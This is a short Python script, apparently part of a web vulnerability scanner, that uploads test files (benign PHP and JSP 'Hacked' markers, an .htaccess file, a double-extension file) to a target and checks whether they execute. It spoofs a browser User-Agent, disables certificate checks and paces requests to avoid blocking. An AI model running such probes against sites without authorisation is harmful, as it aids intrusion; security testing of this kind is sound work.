import requests
import time

dangerous_files = {
    "PHP Shell": ("shell.php", "<?php echo 'Hacked'; ?>"),
    "JSP Shell": ("shell.jsp", "<% out.println('Hacked'); %>"),
    "HTAccess File": (".htaccess", "RewriteEngine On"),
    "Double Extension": ("shell.php.png", "<?php echo 'Hacked'; ?>")
}

def test_insecure_file_upload(upload_url, check_url):
    vulnerabilities = []

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }

    print("🔍 Testing for Insecure File Upload...")

    for file_type, (filename, content) in dangerous_files.items():
        files = {"file": (filename, content)}

        try:
            time.sleep(2)  # Avoid getting blocked
            response = requests.post(upload_url, files=files, headers=headers, timeout=10, verify=False)

            if response.status_code == 200:
                print(f"❌ {file_type} uploaded successfully! Checking execution...")

                time.sleep(2)  # Pause before checking execution
                execution_check = requests.get(f"{check_url}/{filename}", headers=headers, timeout=10, verify=False)

                if "Hacked" in execution_check.text:
                    vulnerabilities.append({
                        "type": "Insecure File Upload",
                        "payload": filename,
                        "recommendation": "Restrict file types, validate uploads, and store files outside the web root."
                    })

        except requests.exceptions.RequestException as e:
            print(f"⚠️ Error testing {file_type}: {e}")

    return vulnerabilities
